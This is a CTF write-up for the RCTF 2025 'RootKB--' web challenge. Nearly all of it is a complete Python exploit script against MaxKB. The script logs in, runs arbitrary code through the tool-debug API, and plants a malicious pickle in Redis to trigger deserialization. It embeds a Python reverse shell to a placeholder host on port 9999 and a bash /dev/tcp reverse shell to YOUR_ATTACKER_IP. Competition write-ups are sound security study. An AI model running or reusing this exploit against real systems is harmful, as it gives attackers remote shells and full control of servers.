---
title: "RCTF 2025：RootKB--"
slug: "rctf-2025-rootkb-minusminus"
date: 2025-11-18T00:54:51+08:00
draft: false
tags: ["RCTF", "Web"]
categories: ["CTF"]
description: "RootKB-- 题目的分析与利用记录。"
---

本文最初发表于 [SU 战队的 2025 RCTF WriteUp](https://su-team.cn/post/rctf-2025-su-wu/#rootkb-1)。

Python 沙箱绕过俺不会，但是打redis 触发 pickle 反序列化这个俺会，话不多说直接丢脚本

![img](5.png)

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MaxKB RCE Exploit - Complete Attack Chain
增加：远程写文件功能 write_remote_file()
增加：Redis Pickle 注入功能 inject_pickle_payload()
修正：修复了所有 'return' outside function 的语法错误
"""

import requests
import json
import sys
import os
import base64
import textwrap
import pickle
import subprocess
# Target configuration
TARGET_URL = "http://xxx:8030/"
USERNAME = "admin"
PASSWORD = "MaxKB@123.."

# API endpoints
API_BASE = f"{TARGET_URL}/admin/api"
TOOL_DEBUG_API = f"{API_BASE}/workspace/default/tool/debug"

# Session setup
session = requests.session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
})


def login():
    """
    Login to MaxKB and get JWT token.
    Returns the token string on success, None on failure.
    """
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "captcha": ""
    }
    login_api = f"{API_BASE}/user/login"

    try:
        resp = session.post(login_api, json=login_data)
        if resp.status_code == 200:
            result = resp.json()
            if 'data' in result and result['data'] and 'token' in result['data']:
                token = result['data']['token']
                session.headers['AUTHORIZATION'] = f'Bearer {token}'
                print(f"[+] Login successful!")
                print(f"[+] JWT Token: {token[:50]}...")
                return token
            else:
                print(f"[-] Login failed: {result}")
                return None
        else:
            print(f"[-] Login request failed: {resp.status_code}")
            return None
    except Exception as e:
        print(f"[-] Login error: {e}")
        return None


def execute_python_code(code):
    """Execute Python code through tool debug endpoint"""
    payload = {
        "code": code,
        "input_field_list": [],
        "init_field_list": [],
        "init_params": {},
        "debug_field_list": []
    }

    try:
        resp = session.post(TOOL_DEBUG_API, json=payload)
        if resp.status_code == 200:
            result = resp.json()
            # print(result) # Uncomment for deep debugging
            if result.get('code') != 200:
                print(f"[-] Server-side error: {result.get('message')}")
            return result.get('data', 'No data returned')
        else:
            return f"HTTP {resp.status_code}: {resp.text}"
    except Exception as e:
        return f"Exception: {e}"

# ======================================
# ========= 新增：Pickle注入功能 =========
# ======================================
class PickleRCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        # 返回一个可调用对象和其参数
        return (subprocess.call, (["python3","-c",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'],))

def inject_pickle_payload(redis_host, redis_port, redis_password, token, command):
    """
    Generates a pickle payload and injects it into Redis via the RCE vulnerability.
    """
    print(f"[*] Crafting pickle payload to execute command: '{command}'")
    
    pickle_payload = pickle.dumps(PickleRCE(command))
    b64_payload = base64.b64encode(pickle_payload).decode('ascii')
    redis_key = f":TOKEN:{token}"
    print(f"[*] Target Redis key will be: {redis_key}")
    
    remote_code = f"""
def set_pickle_in_redis():
    import redis
    import base64
    
    try:
        r = redis.Redis(host={redis_host!r}, port={redis_port}, password={redis_password!r}, db=0)
        redis_key = {redis_key!r}
        b64_payload = {b64_payload!r}
        pickle_data = base64.b64decode(b64_payload)
        r.set(redis_key, pickle_data)
        return f"OK: Successfully wrote {{len(pickle_data)}} bytes of pickle data to key '{{redis_key}}'."
    except Exception as e:
        return f"Redis Error: {{e}}"

set_pickle_in_redis() # <-- FIX: Removed 'return' from here
"""
    print("[*] Sending payload to remote server to inject into Redis...")
    return execute_python_code(remote_code)


def execute_system_command(cmd):
    """Execute system command using a robust method."""
    # Using subprocess is generally better than os.system for capturing output
    code = f"""
def run_cmd():
    import subprocess
    import shlex
    
    command = {cmd!r}
    try:
        # Use shlex.split for better argument handling
        args = shlex.split(command)
        result = subprocess.run(args, capture_output=True, text=True, timeout=10)
        
        output = result.stdout if result.stdout else ""
        error = result.stderr if result.stderr else ""
        
        if output or error:
            return f"STDOUT:\\n{{output}}\\nSTDERR:\\n{{error}}"
        else:
            return "Command executed with no output."
            
    except FileNotFoundError:
        return f"Error: Command not found or path does not exist."
    except Exception as e:
        return f"Command execution failed: {{e}}"

run_cmd() # <-- FIX: Removed 'return' from here
"""
    return execute_python_code(code)


def main():
    """Main exploitation function"""
    print("=" * 60)
    print("MaxKB RCE Exploit - Complete Attack Chain")
    print("=" * 60)
    print(f"[+] Target: {TARGET_URL}")

    # Step 1: Login
    print("\n[+] Step 1: Authentication")
    token = login()
    if not token:
        print("[-] Exploit failed - cannot login")
        return
        
    # Optional Step: Test basic code execution
    print("\n[*] Testing basic code execution...")
    test_code = """
def test():
    return "RCE confirmed - Code execution successful!"
test()
""" # <-- FIX: Removed 'return' from here too
    result = execute_python_code(test_code)
    print(f"[Result] {result}")
    if "RCE confirmed" not in str(result):
        print("[-] Basic RCE test failed. Aborting.")
        return

    # ==========================================================
    # ========= 核心利用步骤：注入Pickle Payload到Redis =========
    # ==========================================================
    print("\n[+] Step 2: Injecting Pickle Payload into Redis for RCE")

    # Configure Redis connection info
    redis_host = "127.0.0.1"
    redis_port = 6379
    redis_password = "Password123@redis"

    # Define the command you want to execute on the target server
    command_to_execute = "bash -c 'bash -i >& /dev/tcp/YOUR_ATTACKER_IP/YOUR_PORT 0>&1'"
    # Or for a simple test:
    # command_to_execute = "touch /tmp/pwned_by_pickle"
    
    # Call the injection function
    result = inject_pickle_payload(redis_host, redis_port, redis_password, token, command_to_execute)
    print(f"[Injection Result] {result}")

    if "OK:" in str(result):
        print("\n[+] Pickle payload injected successfully!")
        print("[*] The next time the application deserializes this token from Redis,")
        print(f"[*] the command '{command_to_execute}' should be executed on the server.")
        print("[*] You may need to trigger this by making another authenticated request or simply waiting.")
        print("[*] If using a reverse shell, make sure your listener (e.g., 'nc -lvnp YOUR_PORT') is running.")
    else:
        print("\n[-] Failed to inject pickle payload.")
        
    print("\n[+] You can now try to verify if the command was executed (if you used a non-interactive command).")
    print("[*] For example, checking if the file '/tmp/pwned_by_pickle' exists:")
    
    verification_result = execute_system_command("ls -l /tmp/pwned_by_pickle")
    print(f"[Verification Result]\n{verification_result}")
    
    print("\n" + "=" * 60)
    print("[+] EXPLOIT FINISHED")
    print("=" * 60)


if __name__ == "__main__":
    main()
```
